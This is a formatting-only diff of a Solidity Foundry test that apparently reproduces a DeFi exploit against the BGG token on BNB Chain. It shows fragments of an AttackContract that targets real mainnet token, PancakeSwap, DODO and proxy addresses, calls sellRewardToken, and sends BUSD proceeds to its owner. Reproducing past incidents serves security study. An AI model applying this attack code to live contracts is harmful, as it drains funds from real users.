@@ -19,12 +19,12 @@ interface IDPPAdvanced {
 }
 
 interface ITransparentUpgradeableProxy {
-    function sellRewardToken(uint256 amuont) external;
+    function sellRewardToken(
+        uint256 amuont
+    ) external;
 }
 
-
 contract ContractTest is Test {
-
     IERC20 BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
@@ -32,7 +32,8 @@ contract ContractTest is Test {
     IPancakePair BUSD_BGG_LpPool_SwapRouter = IPancakePair(0x68E465A8E65521631f36404D9fB0A6FaD62A3B37);
     IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IDPPAdvanced DODO = IDPPAdvanced(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
-    ITransparentUpgradeableProxy TransparentUpgradeableProxy = ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);
+    ITransparentUpgradeableProxy TransparentUpgradeableProxy =
+        ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);
 
     AttackContract attackContract;
 
@@ -68,9 +69,8 @@ contract ContractTest is Test {
     }
 
     fallback() external payable {}
-    receive () external payable {}
+    receive() external payable {}
 }
-
 
 contract AttackContract {
     IERC20 BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
@@ -80,7 +80,8 @@ contract AttackContract {
     IPancakePair BUSD_BGG_LpPool_SwapRouter = IPancakePair(0x68E465A8E65521631f36404D9fB0A6FaD62A3B37);
     IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IDPPAdvanced DODO = IDPPAdvanced(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
-    ITransparentUpgradeableProxy TransparentUpgradeableProxy = ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);
+    ITransparentUpgradeableProxy TransparentUpgradeableProxy =
+        ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);
 
     address owner;
 
@@ -95,12 +96,12 @@ contract AttackContract {
         _;
     }
 
-    function Attack() external onlyOwner{
+    function Attack() external onlyOwner {
         BUSDTOTOKEN();
         TransparentUpgradeableProxy.sellRewardToken(BGG.balanceOf(address(this)));
     }
 
-    function Claim() external onlyOwner{
+    function Claim() external onlyOwner {
         BUSD.transfer(owner, BUSD.balanceOf(address(this)));
     }
 
